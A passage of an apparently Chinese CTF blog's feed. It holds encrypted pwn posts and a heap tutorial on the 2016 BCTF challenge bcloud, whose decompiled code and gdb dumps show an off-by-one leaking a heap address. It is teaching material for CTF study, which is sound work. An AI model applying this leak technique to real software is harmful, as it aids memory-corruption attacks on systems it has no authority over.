7d78b8a25b1122a751f7284bb349f9fc0403cf0ec2ce32b24e7ad1bf1ccb419d7e35c1b59969285a9d5f94cb5430b0ae5530fdc6dee559e05011c320619c4a0301e35fe320fca3c6d26607b1a98933ae1441b81fc807f356de5f6664060ec87bf67d768fa3590b6e443ec4e4ca97fbf75d4fffee78480d30ce0f60d7b0411d45404a46e1f11f2bb2d4a093c2a27ba0491db0e7423fddb644b2ac5372777593d3449611efc66c1bc57f220918e5bce212817a9a9fb1aab43b88beb32a70026e4d08a765e66aac0d046ebb8ea918c5ece581eef820ebfdcaf3aaadc48c14799e9ad2805c060cdc979bfc1f295bf23e2970abe39c97a29a0622feffd2f64c3f0be3d3bea548437615c86433b3f7a627963689930388e95ec25cba1496e178705340c5a348c8b8f1b6b9f66425be47529d14cbc22c1daeacb0414cea943c638c097d05e7aca186dc2ebe086ae9da289a0661868d05fde8fa09f48293d01833d95f43da684fbc8bb33147c7564683c97554cba0c03d3c1281006ffae3152c873cfd78c4d5783aef931ffd8e39e8d3cc6ebe19870d5ac17f58b21baa3558b57c20ee79763382c0563ba67aa7a3c63d0c49e73f472e20104b6c37285d5df40d4608ca435f0294c2d55b99edfcca62c311319b2bdccfe97abb0387722584e761c042d45169c86d53182dd80f7f532031c0a639dd62104f8dba692f09013c16711f115a6e00aa6c2294a45230d671f6033518dc11c842e98e498366fc7c5717b01256dae63ae41761f48b7870d6f8dd88fbbd5bf4fdfa3720df1da2cbd60a572cf01462d5991d774be3ce6e83eadb6a06dad2e6c86065def60a50f1011d946054a6298bc3fe4ef70139c6a2c53db4c7ce751b9669a3729b7e8d357d810ad8894e2a71c69f7578d648fa7a26fbe9655ba5b77f60020843a912d7ccd2a0f75f07bd3e502d39d2b01e1fbaef1b7a1febb793e38099468180cc977f7f8706a1ae2e9b9460da486d5f6750a2cbd160853e7e49be3d4c83653517aad204e28bce998d19daa4f67d26b272515440290c313c0851baa0a292925dd3a46124ac7284d9eb4ceba531c23aec971525fdb286705d23f03196f383261f984497fd2e2b5bf245ee584e0aeaaacb2f10266dcadc53f6bde47e811814dd92dc6907b11799e070963765e2397bf09e1cc9300eb4ce774fb307d909e4c0764101f216e0ae6207b11e1975427c5cb570df4715def777a7c1e7243f3b90c71bb3c7c1b6ced13ccfe9a40bced937a465557c6e2113013300b8eb67d04dafe06d8e477a9ced0b96402bddcffb0c26f1523a11c5e9c775015736527c5e44c59dabdae1562c801477f97003c11be8897ed5c3a525dc62da35dc1754f7bb7825d1220d1c0546f636ffa736044716227aa731b98ea07f29c556d1f743377db8e25297df95449527c03b5cba52a5eced62c041f367213800f623780aa26e3bd521246aff5adb1e3cd7be72d44ba056dadd61105dbfed2fa992bc44acbfba12624a3e32d26815a87fd0c64743810fc81da8a4892dab83c1f35390b1c576d592feb3864373c76592e51aedacdd7c2bcb532e3730348557b0a841787ef728e73bf79b39871ef5f4aaea36ac46a9cf7e5a6de1edcd6dec4999666c8959287fc3d8c935587a350b8a9494a649639a144db4f64f8eb1e9bbe2ab181c9c6b85d3370351b2d231f78f448b9d02bcb5a49a194f0c2e21339f22ab06dfbc0bb398f23bb80f5dc0fd8f645bbd30766146eec75749f135c12bc74a8ad69c404cd8e65743cc57da47f4d5022ce153c0381769ad0c4e6bd841d3f2e1c8ef8362d4a91731c6e3cf47fc5caab204aa31a8639b47f1dbe6b5932e88f15899eb9c52a748f8feeadeea4bef70ef133deb8901fe0f4be5040abe7924dd356a0ec173b2952ac3630b9b34d3f0d400deff73034d601cf02d858332a09eea5af391fa0e57bf212c5996062c8355668b860c13e9519d17ebe95fa16b75318d5ae0525cc49648a6ca7dfa51aa0c98296f6d263331e2f6b469bdd9b37aab69539b20950048752634cab5324c615aab90dfe63aeaf2caaf82e4870a9c5aa6ed8a0f5e716fc5cdf59ae80a8c2a29a781011069d9e947af124b63f9f6db8323370cef167e03562bed3623ee2506ee105d55f9a81bae2e95979fa92093cddbcd728dc7308e657047db88f5431797c7233b2c19769edfaed060e83b17a56542768cf6f0936fcfe0a37fb37612e0d939cab5e91fa46f27984f84c8b830bd327c1edfeb9379f5113af2968f1c72a3952fb14a80c91e0dfe7e2c23f61523afda416e6eaf3169df20de3c5f0fbaaabfd8ec2f521f4f9a6317beb48aca0a005a7a291ecd502c291108f29b1f47fbd748e93de618a87e640ebf561fbd3f1854c676bfa29eeefe175a132bbfb92b53633f7645abc413eba898481f3737eee2bf7883d28079f0b5ef2274b3054e32c76db0f1cd864dcff3fd1be89d57cb59017f74cbd4723a276e3949b62f9d7e375e7eb68d10c18b6a90fb801ea9e2049062a87768c60f959df5d84631b80f2278f8c8712ce3b74acb6613c86e2fe603fe66f2d9580fc85825f043d69e50cd13424369e9a3cedcfbfeda7dcb77648f08fb5fd6650bf44939436bc5621b56c85da2ab4b3321c4f38003064207fee917aadc52c4d73efef5f375ffbcdbe16410229f75c2023fa3a94bc3f7f9cacabb50c6eb684e9cfae35b24d5f58df950c8b3e79bbd887cfe6e9c01319d92c8b40444d0fac45dc75921725ce522c9e9dc207cb9fbf232147b18b5a1b72176efd7fd34c6103714cd75cd4119b7962c3b289f53d3b609d3f17b5558580e13aa3035286dd605533f9f36d40a9683f3cc9825351afe90acbc400a94f37c92936f84e1229800d5eb98eb7f60270cea6a8cb938e24d3bc4f582ccdf6b59d73015d9e354215fa3cb2abd9e75c41bd05e42a84e06195ef74cf0483aefe09c7f7bde18c60a08ca89c0dcb7d7818b9c90d8fc56462bf1e1093be0f04cfa30637d6feda3c6df3fff664ff2a58ae1b93e4874ff2b8554fa6fcba9159883f69c996e32b83dc7deb256e372ba56095a1c17bdc24e74d7d0eed33dfdedc2030d7b267135fa559816155fe81a0d32989c6c6c9992aeb978307a99f057734efeffe7cd7576ca27ea6ae36bd0ff6cae3352996d8ff7764b73c33e3429b3d54f18c967c681c6099a8f501a5b9a0164d9078fd18b24ab9ebed5061feca24090fc9e816fc38837a0aa46602d9a3d73d6ef232c77de273585331f2675cbe211f884252752bb6f56f65d0fabbdae70e37a2a2e0f76a05ae0c551b59d0fa5e8476055e41728dd0d32a5116be46ff455ef4915246182f5890742b711053e70ac9d9abb31a795fbd136ad8819c9a6d0204447965dd645a92ea49276863d3e2953f79e4eaf4217dfba6af1ecb6b2575b1bb8723ba85d6d7063d663bcbf771256db3f841bd412c2c4dc6db095550cecb8f2441c358728ea6d7d1d55119a8ba22683099e20ed4e4ecc950e90c6fa3366dfae86cea311aacca78ff429949c5594597c082ac311fb7b9f5cdf1cf02aa48ea376de44cbd817931a44818ff6a029e12436e5502e6076c85f7cbf3793ee1a3d328b086de8a0864e71a9210c22a1d6c8bf236e456c777a6d1241e9af6989de9a44cebd620ce88c23eb3e483720510d50adc77e90c6a1c31ab11a73bd4d0be6215acfda43d2e1e9265b38aab063b2ee7b7c61f6326c9c22fb29355626187cee0990dfb11e6768e0be56b5456e150831dfcd282a9dddf9ab6244418fa647ef03afc2046d10fe1ad4d143b7555a86e88e8f48a4df98575a42f66b7fbe40be9b9f0b281cbccabede7bc68fae790c7ca908bd754e26f7dcdcad4f1c94de833c9564ffeedeb0cb4e508bd227762bf1315879db81cab93a53c94e62c446d6a9172f44682017b12b88e64cee27603567f52ffa85a4d6225f9f00634f57542c6d6640c59d60aa2ecfcc40b9e8057b0f476387b4ca1b6640b473eb5a1cd5d28dce1ee4136766cf3ac639744c7c515d3f95a4f4f29c134fd2c6c5a657b6b952220448b57113a75df323cc99c121acc8f38d6e23a03294d43e800de6071c13a191f76e237d2843f0c9db1f0f893e1d9c157dd73010071db87f9cf629ad1a0bc19c24ff3d5b0c40eb85722d4fb5bce4868ee8cedcb16796a53fcd558d1678c69f6f1fd17785a460010239f23245d927b0514d0d287088ac9d38a7b56275810a582f3d3a327435384151838f8ace0cd1978363ec2c354a9ebc4af90b9ab7fff7f2692a9cfd4829a88c13d533a4e240e474ba2da929ec6c9e6563431b09c0cb4f9eff905e40d4d2912f626fd311f4fbfd30ca74421a65958b5a94b150271e04a335569a9fe75307d30260ba597174708f848007c54e3a4faee5bd6e0b3ee326c6117bcf4169fb7471f4ee775fd8fcc479f76803e4475e9208baa7472e87971767aaff1ec3cf8c1f95bb3e479389e8ce2369074f8e7c0a8882975c289db8a074a485698e884083f20fb09094317a0f32e5e8171220589baa8c40711b931523a9021a3433c3d47c4d3cf5c0851de8bc7f05668598da9498d5e8701e184098e23929600eec0caa76c4a3731b32abf20e5ed709b86e09405a43fb50997b5f633ebc7848764ef9ae94e47bc8f42a950682d4b6d81eded1fa828855a4d8687621cd2acf163ba20f992d8915725dbb59b7fc085a7a1528480423a5815d47c3831f71c59358f9d7861a187982ec6cf0bd2f85564688a5b458ef47a8f5bdb955bbe8c5e4d6301403d65c3fd284ed8ce544f01b7401ef8e4b6d9a73a7961f4fdd2d923c073c34ab6dd8c4aaa2a26a7d6d3b6ab9138a63ff8f9f07a4776d66276bbb22c35a19b94c1dcb38d94de9400bba798a12ff26c21b4168652917ad13f6d3f32d5722a366d0d36732e1df946bfdfec9c9113c8d44b76de1379fd8f124479a9e3781039f42a46eb3b611c93d967b4f343489f58721e851e43b8eb59275ad78b5976a1754e92177be3652a9e0b444f4b221c2a403744c1d8f15b9f59110d25b34bc4fb324fc81425e7756d841b095591ac33a3a0f1a0a94714c7364982fa48bf49dbd1d6b357e430a19d7dd9b4caffdcb6d7e7c8ab7a3ef9bb379381ddde7e481517c44822d070def11cc304c9119dbadaadafc471fe26b83eaddda3b34eb5da9d8ac27439eb22386f77f015443afd2cd7aa45f3103f1a9a997c214e6df3d99d71d4f82ab7d6af6fea2bd5f2e4c347bdc6f7b78bc5e010c97bea251fb18d320c783b24af1f6e9de45c0b707865c485ffa1c65d52a528953a13c86ebdda1e66567afac7caa86d6090dcd29cd33b498463281ad8c135566e515c874ed4ed114432de055ee864f3fe8fa15b460d6d9fd786b635eaf4677403a084e3d8698c01c4d2175be2d1dbfd5d1447f07873a9921f677bfdb1ee952f80b9049dcd073e22d58740b691efb57acf9e6e458d86302be1c0dee1cfed662641c415c8b79e52970e09d20e02cc0c1819462e827112f56d92352eb3061470ca839769a2f0fae827f78e80b0f7233ade03f41f583943b42be92faae90a9bccd88e1e7517cccc39e01bd40de5a4a628df1cbd7e4a66e1fea6935709662068c234005da278e905d80a91b6b1b3c5a2d2a5f2af3f26390f8a97aaa5b258539eb839802bdcf1f715cfee29bc29138342dca0e47fc67803ef83793c4033736e8b26df8454020a381cd7b144e045842bd70a37883fb4cd2ea0694e6e703cc71ec7be5c3e2627eba067b36d0ecc3d1d2516c3f875a67a4d17a5bf7834286a14e2eaf867f17cbb227fdf7f83c44ab6910c1e947842966f7d0f819c5250ae977b781057dd048a928d4662e0fcc309377393b095d9cd8873e303b85c3b1ea2143003755154fdd804bb03d683a023dad30b48c6c2b4a6a4bd0273259e81bec58d2e13e711726ddf56bae7ea547a10db2765d31fcd8a1e32d263e4fbdbc6ff646fa997e3f154f41b79bdc162be90e393951d0917a46ca9a05bb4394ef816f7a76a7e6ae8199a3542a9eb365a8383cf831adc9cbc406361435b0945744b6e8bc19cbb2ad6c0c2dfeeb9892ae228a2e47e3574954c25c6f182ec03e636c22e59faf3bbde37e7670dfc1b82b9a033a7458021627b651cd2a59150bb2558f76f4faf70d8965fd33f76df4be6dbdc57c042ce5806daba50e273f926fe7ef3523fe56d71b5cccd3c1d578a3007e98eb41d7de542f73616d3092897809d2fc65754758c61b95b204179ff0531227161616870931f4e4190a0368758b9d9aa297efefe471ab2e47c406f5d5918a452e8ecca465b687f67f91fb6e6be377c45bdb22b51f0215af7756b2d710b16441e9f3d8b489552d31165310a31a757d13e23475f8734fa4fe25e4adfe32a9762a0e825350b230bb26909f357c9fac859237f6b817df6bdd2db95799a4122f1cda44bb61cc7c08101c82f0838a4283c048ba6f56b056b282406e3c02c1846db84cbe77bcf9f05e8c3cd24d222c2420538378c0d3b556af0d2e70f392a88310b47c56fbaf31f3a07ff76132a7d3241e42c79dd47d854ee51d42ab1c42d2b93d92926e12ffd4e4f57512e5dbafce5caf5bde22a2fc681e8dd352b43486865d07d1d1336f0667f5fed3d87ff6d57e8e35812c1022b8bffb6af4e0be3f1be4039b1bb12c99c798144ed671827c5f91707cbfb701b8965fe3288636dd52bd6748c1046e013c36f72599a30bf91bbb4e84dcb477debdb7f54a6c16c72c8c8d4c2100aa49b1b5d684e30cddf3b3467bc4626d96b7d80fe3b5a70905df6040bb7d21d1f0bb35c234987fbbdceda5dd0be240f105b0fa25b0d6046a2634b9767891cde2f1794f5247dfca6103b3599e7ab2aa3b7ae74796b98a1ae4f43a61912613233d3ee0f5bb5e15323b26d6f7d71794bd7cd3311a51dd782b7994cac5b32b92749faedda92ca3fcebc7db5f3f63a153c4813c66a8ce370f2f7219e1230bd4d4dfb8fb9e8d5d050cf89205e3cb4654e87b6aa7807b34d8d6990380b9adc8863b8d2499e8cf05145ed22a2a7d32004abc94b84846c4690459ba385fac59c837faff87bb7531e0db66fadc137c491562363ba54ac0a2c6e0e077b795ca57f888bfc093a5e2732f0f8359f85bb33af5d822be83a5da426372095060352efc5bd4e84b83d8a1f2cceeeb7f130a2697bcf4074aea268fe15b581167a99061a299386e1aa6c0891dfe2791fc49d83d37a65bbed162810f6b9b6977643eb4f277bf60aeadf0535ce1c59a06b3bb34e64ec6b718c08ce05e0e95c88ac69b53f00a891f8a71f3f89c32a5dedeb519d980bdaee54f8076debb61d19534d7c63c22ebbb464dbd7930d3f09e0ad41aa35f1954d57e6b37c57c477f90a0ed5e8256998187d46f0876b83434a6c3cebabb06f7af447fba50b78be89539db06feab24ba0d39e5e8855b0cf23839a749e65d8fe951458427d6c374dcdc561a63758918fc2f883978e6d691d1ef283a97642b6fdcdafb8269a6f66f53cd7f17a4ccfde9d6a656278a72c1fd2ab4efc9be30f6965c039c017295c33c3dcbdf09ec0e93b122621104c3bbde751557ac60bbc3c4a98325ce6527275e9a7347c680b1313562c2c091be5ca0f8a52c0e89fe322a455cad8d416a688fe823efcedd34aabf641a733a80dc676f3b1779d731a496f57cb28e1a78517c1aed33d4c81ab1fceb59375375c520b1b36a57a247d74cfc101ffd495e9aa742a884e508713719638f2ef5ce48c690694c6b2a54b4cf1d357abef614b4edf526def7e39d408089f08f0fa79d952630d852f08d62a6f60d4bb96252168952f08c8134740541fbc500d11d4376ed883231fb4b49becb6057101f080b1410f3c3f306b27ea9c99b74bc6140b9d00456de7634c1a1bcce63c240e3963fc91b46fb141475464c7d0cff826ae96c741ca844e987f5f9bd2f9518a370e31459ddadbe65d7a9215d6c2e62ee8e9a5b7584d6fa7aea0255e982a506c58f0716d0335ee442acefb9e80f8b64f24bc328e40f2e0d58f6583f6b59b91e2eac55560670b3a7cd85623c1fbfbbb4f3d90f34704c9bccd57ba3afafc13fdd749e47165c07a820a5ee069d43645fd016ff8579199e72fceea3855dcf861d9e7bffc90ee497b7f845b8389d8afcdef856aaecdeaa38312ab7dcedd0228f23d24f5203a339d7153667c9fcbc570f5c8a7cc28dc76783aa368d826832aa4851203ff352f3827810f6851cdf5a9f94e872ede87f3bd50c2a22f70834a3d094d78a6a73ad8680e1f9cf2961a6ce6241cbe55b20e22fbdcb3696a831717fb227b78fc25b5d9af9218ee3f1eb68e69d4be0c3e483967b5ffb3855f78612df068dc8deb35427f48d38edb6f2ce19505f3ee5ab26bdafc7cbdc2667545a2751ca8b1c33e31044b124c94a1892b25511c06ddd09ad02249949f027b1844a87513d92181f939379d0bdb20256eee8a466bb791068b635674c6abd8141b21c1699d4b045a67152381fa03f7d114adc109c1435a617adf68aaf0b3a23664bc955a641e1cbfdfc8bfd14f6e4765193e4f20baba18d725a33c65576dcbc199a508317b4ceeafc2539f11c625955073bcbcf142915c64f19683e82d106ba8c1695a8c9b10e2c82aea217c6c534f0f0c36d787cbdb285c0ded7fc140f870fc18d4049cadaa2094312beed290b2fc6ade5045f6eb318e3aa3c3cd0336614474dbe834796bf7454bd21ffc9d23e90991c2b635300477eba672a724322fb3cc3a5cb6531d035813f0b5a223bd2c24e8de1a28ff6ca97c28a71b71c03afdaefdf6061d6331ea75103b86eb1c4750c83cc6366cad7745a7b7fd51209ec018ec2395d8acf14194ac395585da8811d4bdb5d9a40bf2f28adfdc09a41c6eb07d6e52e6ca79c3c63f371328c80c132969336f7655dc9247fa86dc0bef56b1c218b55d97894f74b9e5f6e4276e34f408f8d38530a15c23042d6e5db59c2432bc3c2c2e35234d181615a543bd003fa23df591b37e085049d0b6c1d4c65f0ba446e5663239cca037b8d9c242953f03b875f8cf62c0beb8b1f6a24e1e727970392bddc4a4233fd5c044db08ea45442007287d0261ee121ce5773ccd398ef8508263bf7b7105ec504add56c7940b9aa517b51dac3ed0ee2c06eb122cad0a516fa084050489e2c4244a81cdd626eca7ec743dfb1c901ddeaf50ea57bbf984cde640160da0a67196e3ef6677e3a95848fd8b197c1c26b28601a4bd57166b55573e86a76726c70df7c8455a6c1ef2db240e2fc452d89e433d6568612e12b8b308fc0b82bf680ef91e72cea8cf29a4a298292d10c8021bc3ead229cd904df074a7b7fd8189c187556eaa97a54fe720c2ea404c4f3798ff06d57430540e4f6bb4bb7b79af62c15ef72d3a513d00acf3d6c6ebbeca30e677ac52e605724c8c07b70f81e8e56d09c0c98a5f141737b1efcb77b16ed9950af77e6f532175d8f549fc08e8007a7d6efbd46a86639865aa912272e8b6475603d25bf5d82bb71cf6382bfb276fe53850f6e509dc259f8d0790817c505fa10472579d21b71c31c8fb4a94da213821cd7cb3c608ad8af2c93a7ffcb6e352e582d69b259f8cb46cbe17fb01ec1686d8b4bd96602a0a4a2d56e8eedb4982df44d94a734fca62c7c792c3e1f8e0799588a2eef6b3021f8595b16370049c38c208079020007faad4043b48a4680043ac6b6d6bd1fc47f6ae51c1a8b014bc3076899d84faf05063a9430c783627387c1059fc931a10ee40394d4d6a35cdbdcddf0272a554bc75a8e0dbe86634c62b1783016f99431541e26176bc1eeb8d0c51115f053dc3f81ccbceb1e4198c70bf6e87ab1b9c652df46086a2cf14172d365bc473cc1b9b0ac677ff998d3914ba45d924eea7641883fea4df63f7d096888c92f74b4ee7f5b332734bd853776799d6eeca6652b113007eaae73849a3ff5afde2779fc3b86a5ee309821d9e4031dd658417f23b9e8cb5d8c511ffdac2680c03faf76392e3b337d758e6c5d630fc8d5b0b726a9936d26b85a2a3974540ea1032cf87147087910131448c2e6a7427d154078a83dff4faef52fefcd79e5c6a897c7b342dc7513926933f656b19f025182d715aff011bb3b2800af5082e931d203a440fa4a8a04ca86c8328aa68b4f81fa23d7e58f974bdc6046347f89b63f80fbdefc2aceb6474eab601c6d8f51079218b74b4ab7dba0534f2386f96a38961575df1002e9ac9873eef696f94166fd4bf51f988ff72f0d263793dab8ecd0954e22965ad93edd9fd0fcd9f65a0b4054ebb7b197a9f9403148bb00fd0d34cb432d8ceb1550e738030f7e87fd6d2b74ce5c407e5fbacc886f6f979fe40580deab63e5e7dac47f3c717a314a67480779c241097684f7a383caa6f01613c4181726a14c37aa87ef7d2a1f0f1d665e109f41b491f3cb56338558c6b0e17209e8c50abe0160b3d77c36d29580900082080e20c0e9d12d36b1b8c154ea70cf90b321b1d748569b6084d4998358a21b33824107ba67a7d1fb08a0baad9bc949a78be73cc72fd55fce1acc4f3c492af98039c3f677e1902f556f25c27d9d54eed9fbbfbd54f9e8d573ac5f84c9b4bbf0669ca050e0a8e5ba44f60aa40bff76e853e368129c61a2b90aa084649dc8f381465acd3e6e87f588954552af4cbcbbe9af9beb7c19b192034380799f993c12637f717e0a9006bac6da07fae9d1525f87e34f422e60d013e12009e3f52b33415e03d6e90b69dd3ad935379e8d5de4dfcef963db3ff9e6a3421c9d5911bf37aa0c5464bc42c597b011ff39db7be54d58e2e92e40d45c4d9a96547e2d3b77a9251abdf024250e1da78d69845ee7fdf56a380354f7d3bdb49f0f4c94281dabb8c9bfbfe36c8fb33e2178e1ac02e4c8958d921c7905e7dab5c052b430b3d1aa9aeb4eceb812c9803a1254182f157aee2cdbb8e41ca916ea7646f02e099d22922d0a8c43c59dc99ea5e645ec5ae7979e53d58e51a1259b5644eb16beecb9de78dffdc19b916bd51c14e520d35f38399d96749000ffb4bfcf5ca40026d181c34dd9e01ddc8ad8d5c8459e6a555b4e3ed35c1f213652ffaf3e7b78be591965e18609df0c8f1562806a39aed4db1f6673865f282609f5a096861ef4d8bf4d3bf228790baddb22e045231f896e15222571aa0ad8c07e20b0f024f451e6d7b720fe9dbd522cd83a71fce7fbaf433e0592a01bc61579da8bb2b096315615f3e56d9e3e921d7de617742bf5d773541bc518abc96b6e2c826a92502065227dce1406907ff3d058950b4ae8c311981b2c99b2b35c3da4e8de4ea286df116f9f30039599512f8ce0d8d8537de3639c0fe6f82a8fcb7800ee17b245f9c3a59c051d7aa753e95ddf4c131cad7046678eea7356c64b5cfa064cfd212aa95cd6347ba8a1cf0871bd37842cf899198e6b03d4696515191989fd98410c80ab85df68804ba5a8c0f2017bd386ebc0937ab6bc0d4b5f5e4e1360cea70311d1f6af3ae730c99e5d842cf0ddcfbb2686f7afcbe10c60ddb016c266c2eef9ec1b6cfdd764565ddb234afb0c8751f1058c407905f682ccba79d7f81225280c79753d421e8ed96ae77697bc030eaf034a92dd7393eb7e1a06b10477b0d6566aab77f239183331757529b65b0471503f242de218f0dbfdd7dcbe1d216ca7c8f6b78856a7f7787568abcbae1b5fe2489ecb3e6c14733dd86f14612841005de63b84e1343ba18aa45f37bfb6500598cc1cd95ac42bcd46e12ecf8e3dc4b2f8e119be0c873adb90d19cec973839f3e6959718dbef1754d0e10c358bc9c4460e963aebbdd69d4d39a04aa8588205fd14b1c0ef4df5d2e9254e4b9e57f26b8b1fc4ce87bd08f4201065d0c235b2af72671c9c28ca5bcaf65b55ad8adb6ca8fc50002971c015435259dfafe6eb580617e2284c2cca904fbc861eac727a9f85db210ce246f4f16eb55e612b71f24ea3af99edf0d668dd242d42ddad449e953e0d448e97c477eeca92b0e792bdf907f1634f959c17174807d0b490dbfb2ac7e8eaa48f47aea19714c66b1ed73861c2c309c90380b7b40d025402364887f8584ea9ffb54efcd0486bb48c065457d650c449cd2c0888ba9da78569d70f387054ac7cf5bc99eb4a38324e8e9afcc5f1d1c828ba8966dca35b886e21653e3edb812f28448a2cca6d536cc32e30d0e28129065a18ae9ced4e17c2676f98cda7a258d847baa8ee8113086ef74ca1251fdf9ca5494ebad6fb356e3fba53aed335e3487da0d9b12b0a1556cce9155e999cb6a652a3c6a27d6570ad85ec918a598527864774204fd2324f6b85271eb039ae823d70da1f257061b462f6eb38c48d68a1179f9b23cee4f538f11af745</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒部分题解</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。" />
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="73ab34ddf01475ab01be92dd2827703cf5f95da38f92882439f30f65a5697501">d95c5b6fdd6be48930edcaedad137a6a6bed167e7fa11b57ae00bb52db4a428e62408e14d9d39b09897859073b3d73f9b5a126d787078239d16e9b94a2bc649141b9d83ea91a73f28de0f8b6d7caaf6a94c28bb22920fa94fe1fc9c15e5e20dba25da1d2a53a9633113c22b53883efa9fc878eed0c0de9ecede36c3ec2a36dcf2cac20f157fe377c05dc2ca61ab83501dc307fb1c7aa4551eb7dd0f99960095f721b87cbb60c471581d68abaa6fbda2071bede4d19adddadc608b454e5abe05c2867ef2981e27d7dcf9d5ac7e7c1c7e033aadedc1394fdb637442f908dade610dbd362f772ddc510a9ac8e0a42b4f3f2e7a240285997f1802b0789367d4673df599ac86148f5b059c8661efa04f4ac0c</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>web安全</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>web安全， writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程10</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn-heap-learn-10"><a href="#pwn-heap-learn-10" class="headerlink" title="pwn-heap-learn-10"></a>pwn-heap-learn-10</h1><h2 id="2016-BCTF-bcloud"><a href="#2016-BCTF-bcloud" class="headerlink" title="2016 BCTF bcloud"></a>2016 BCTF bcloud</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>我自己找洞：<br>发现写的读取函数出现了off-by-one，然而他用malloc(size+0x4)解决了<br>。。。似乎没了？？<br>凉了，又不会做<br>看了wp后发觉初始化名字部分出现了洞，通常这里不会设置洞的。。<br>然后。。。我看了wp居然还是看不出他为啥子能泄露。。。<br>自己调试呗</p><a id="more"></a>
<p>。。。网上讲解都说name初始化哪里有leak的洞。。。然而我看了好久没发觉，只看出了个off-by-one???<br>最后调试才测试出来，这off-by-one刚好被那个执行顺序刚好缓解了。。。真的烦。。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">init_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *tmp; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name:"</span>);</span><br><span class="line">  read_str(&amp;s, <span class="number">0x40</span>, <span class="string">'\n'</span>);</span><br><span class="line">  tmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  name = tmp;</span><br><span class="line">  <span class="built_in">strcpy</span>(tmp, &amp;s);</span><br><span class="line">  info(tmp);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Init_name这里，他read_str这里，实际是溢出了一个字节，覆盖到了tmp部分，然后tmp是在在后面malloc的，所以会覆盖掉这个空字节。。。所以实际上就是下图过程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20wx 0xffbe473c-0x40</span><br><span class="line">0xffbe46fc:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe470c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe471c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe472c:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0xffbe473c:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/10gx 0xffbe46fc</span><br><span class="line">0xffbe46fc:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe470c:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe471c:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe472c:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xffbe473c:	0x000000000953e008	0x0000000000000000</span><br></pre></td></tr></table></figure>


<p>初始输入放到栈s处，然后只有输入的，在malloc过后，就多了个指针，所以strcpy的时候会多复制一个指针，至于有时候会失败，是因为malloc出来的堆地址刚好是对齐了00，所以strcpy遇到’\x00’就停止了，所以这时候复制就会将堆地址也复制过去，进而泄露堆地址</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3>]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程9</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程9"><a href="#pwn堆入门系列教程9" class="headerlink" title="pwn堆入门系列教程9"></a>pwn堆入门系列教程9</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a><br><a href="https://xz.aliyun.com/t/6377" target="_blank" rel="noopener">pwn堆入门系列教程5</a><br><a href="https://xz.aliyun.com/t/6406" target="_blank" rel="noopener">pwn堆入门系列教程6</a><br><a href="https://xz.aliyun.com/t/6449" target="_blank" rel="noopener">pwn堆入门系列教程7</a><br><a href="https://xz.aliyun.com/t/6473" target="_blank" rel="noopener">pwn堆入门系列教程8</a></p><p>学习House Of Einherjar</p><h2 id="2016-Seccon-tinypad"><a 